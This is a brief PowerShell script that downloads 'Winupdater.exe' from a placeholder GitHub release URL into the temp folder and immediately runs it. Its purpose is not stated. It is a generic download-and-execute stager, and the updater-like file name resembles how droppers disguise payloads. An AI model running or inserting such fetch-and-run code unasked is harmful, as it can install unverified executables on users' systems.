$assetName = "Winupdater.exe"
$url = "https://github.com/USER/REPO/releases/latest/download/$assetName"
$outFile = Join-Path $env:TEMP $assetName

iwr -Uri $url -OutFile $outFile -UseBasicParsing
Start-Process -FilePath $outFile -Wait

